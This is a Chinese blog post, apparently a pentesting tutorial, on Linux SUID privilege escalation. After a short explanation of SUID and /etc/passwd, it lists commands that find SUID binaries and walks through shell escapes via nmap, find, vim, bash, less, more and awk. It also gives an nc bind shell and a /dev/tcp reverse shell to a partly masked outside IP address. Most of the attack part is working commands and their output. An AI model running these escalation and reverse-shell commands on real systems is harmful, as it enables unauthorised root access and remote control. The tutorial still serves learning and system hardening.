<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>linux系统suid提权 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="linux系统suid提权" />
<meta property="og:description" content="什么是suid ​suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。
suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
linux引入了3个文件来管理用户组：
1. /etc/passwd存放用户信息。
2. /etc/shadow存放用户密码信息。
3. /etc/group存放组信息。
在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。
用户信息/etc/passwd每行共有7个字段冒号隔开：
字段1为用户名。
字段2为用户的密码。
字段3为指UID，每个用户都有自己的uid。
字段4为组UID，每个用户都有不同的uid。
字段5为解释说明的字段。
字段6为指用户的家目录。
字段7为指登录shell，用户登录shell，当前为/bin/bash表示可以登录，/sbin/nologin标识不被授权登录。
利用特点​ 在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。
只有root用户的uid是0，如果黑客把一个普通用户的uid修改为0，那么他只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0。
假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。
利用此特性，就可通过suid进行提权。
设置suid 设置SUID权限
chmod u&#43;s filename 设置SUID位 chmod u-s filename 去掉SUID设置 查看文件权限
chmod u&#43;s binexec 可以看到binexec文件的权限描述符由-rwxr-xr-x变为-rwsr-xr-x，已经获得了suid权限。
可执行文件提权 具有suid权限的二进制可执行文件如下：
nmap vim find bash more less nano cp awk 如下命令可以找到正在系统上运行的所有suid可执行文件。
这个命令将从/目录中查找具有suid权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，列出该用户具有访问权限的那些二进制文件。
find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; 以上所有的二进制文件都将以root权限运行，随便找一个。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/599d35fb99eb881f8d161b5646b13c68/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-07T09:32:40+08:00" />
<meta property="article:modified_time" content="2023-06-07T09:32:40+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">linux系统suid提权</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3><strong>什么是suid</strong></h3> 
<p></p> 
<p>​suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p> 
<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p> 
<p>linux引入了3个文件来管理用户组：</p> 
<p>1. /etc/passwd存放用户信息。</p> 
<p>2. /etc/shadow存放用户密码信息。</p> 
<p>3. /etc/group存放组信息。</p> 
<p>在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。</p> 
<p></p> 
<p>用户信息/etc/passwd每行共有7个字段冒号隔开：</p> 
<p>字段1为用户名。</p> 
<p>字段2为用户的密码。</p> 
<p>字段3为指UID，每个用户都有自己的uid。</p> 
<p>字段4为组UID，每个用户都有不同的uid。</p> 
<p>字段5为解释说明的字段。</p> 
<p>字段6为指用户的家目录。</p> 
<p>字段7为指登录shell，用户登录shell，当前为/bin/bash表示可以登录，/sbin/nologin标识不被授权登录。</p> 
<h4></h4> 
<h3><strong>利用特点​</strong></h3> 
<p>在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。</p> 
<p>只有root用户的uid是0，如果黑客把一个普通用户的uid修改为0，那么他只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0。</p> 
<p>假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p> 
<p>利用此特性，就可通过suid进行提权。</p> 
<h4></h4> 
<h4 id="h3-1">设置suid</h4> 
<p>设置SUID权限</p> 
<pre><code>chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置
</code></pre> 
<p>查看文件权限</p> 
<p><img alt="image-20210512091902369" src="https://images2.imgbox.com/bf/11/IasIXxSg_o.png"></p> 
<pre><code>chmod u+s binexec
</code></pre> 
<p><img alt="image-20210512092001895" src="https://images2.imgbox.com/48/ef/59K6lBSA_o.png"></p> 
<p>可以看到<code>binexec</code>文件的权限描述符由<code>-rwxr-xr-x</code>变为<code>-rwsr-xr-x</code>，已经获得了suid权限。</p> 
<h4></h4> 
<h3 id="h2-2">可执行文件提权</h3> 
<p>具有suid权限的二进制可执行文件如下：</p> 
<pre><code>nmap
vim
find
bash
more
less
nano
cp
awk
</code></pre> 
<p>如下命令可以找到正在系统上运行的所有suid可执行文件。</p> 
<p>这个命令将从/目录中查找具有suid权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，列出该用户具有访问权限的那些二进制文件。</p> 
<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
</code></pre> 
<p><img alt="image-20210512093627280" src="https://images2.imgbox.com/fa/68/kJCMFJQf_o.png"></p> 
<p>以上所有的二进制文件都将以root权限运行，随便找一个。</p> 
<p><img alt="image-20210512094121712" src="https://images2.imgbox.com/0e/6f/bPX6SAcH_o.png"></p> 
<p>可以看到其设置了suid权限且属主为root。</p> 
<h4 id="h3-2">nmap</h4> 
<p>适用版本：nmap2.02至5.21。</p> 
<p>在早期nmap版本中，带有交互模式,因而允许用户执行shell命令。</p> 
<p>使用如下命令进入nmap交互模式：</p> 
<pre><code>nmap --interactive
</code></pre> 
<p>在nmap交互模式中通过如下命令提权</p> 
<pre><code>nmap&gt; !sh
sh-3.2# whoami
root
</code></pre> 
<p>msf当中也有利用nmap进行提权的模块。</p> 
<pre><code>exploit/unix/local/setuid_nmap
</code></pre> 
<p><img alt="image-20210512095047083" src="https://images2.imgbox.com/9a/bf/GdA3Qfn2_o.png"></p> 
<h4 id="h3-3">find</h4> 
<p>​ find用来在系统中查找文件，它也有执行命令的能力。如果配置为使用suid权限运行，则可以通过find执行的命令都将以root身份去运行。</p> 
<pre><code>touch anyfile #必须要有这个文件
find anyfile -exec whoami \;
</code></pre> 
<p><img alt="image-20210512100729353" src="https://images2.imgbox.com/af/8c/65zS8SCz_o.png"></p> 
<pre><code>#进入shell
find anyfile -exec '/bin/sh' \;
sh-5.0# whoami
root
</code></pre> 
<p>也可以利用nc 广播和反弹shell</p> 
<p>广播shell：</p> 
<pre><code>find user -exec nc -lvp 4444 -e '/bin/sh' \;
</code></pre> 
<p>在攻击机上：</p> 
<pre><code>nc 靶机ip 4444
</code></pre> 
<p>反弹shell：</p> 
<pre><code>find anyfile -exec bash -c 'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1' \;
</code></pre> 
<p>在攻击机上:</p> 
<pre><code>nc -lvvp 4444
</code></pre> 
<h4 id="h3-4">vim</h4> 
<p>vim如果以suid运行，它将继承root用户的权限，可以读取系统上的所有文件。</p> 
<pre><code>vim.tiny  /etc/passwd
</code></pre> 
<p>通过vim进入shell</p> 
<pre><code>vim.tiny
#vim命令
:set shell = '/bin/sh'
:shell
</code></pre> 
<h4 id="h3-5">bash</h4> 
<p>以root身份打开一个bash shell。</p> 
<pre><code>bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
</code></pre> 
<h4 id="h3-6">less</h4> 
<p>less命令也可以进入shell</p> 
<pre><code>less /etc/passwd
#在less中输入:
!/bin/sh
</code></pre> 
<h4 id="h3-7">more</h4> 
<p>more命令进入shell和less相同</p> 
<pre><code>more /etc/passwd
#在more中输入:
!/bin/sh
</code></pre> 
<p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p> 
<h4 id="h3-9">cp</h4> 
<p>使用cp覆盖原来的<code>/etc/passwd</code>文件</p> 
<h4 id="h3-10">awk</h4> 
<p>awk命令进入shell:</p> 
<pre><code>awk 'BEGIN {system("/bin/bash")}'
</code></pre> 
<p><img alt="image-20210512105224739" src="https://images2.imgbox.com/83/88/UmIj7DnT_o.png"></p> 
<h4></h4>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/396aefd4af98a54ecb5c1ef5fee6a321/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">华为OD机试真题 Java 实现【跳房子II】【2023 B卷 100分】，附详细解题思路</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/c5bea45495e21f184cfd8d6045f1a754/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【VS CODE提示#include错误】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>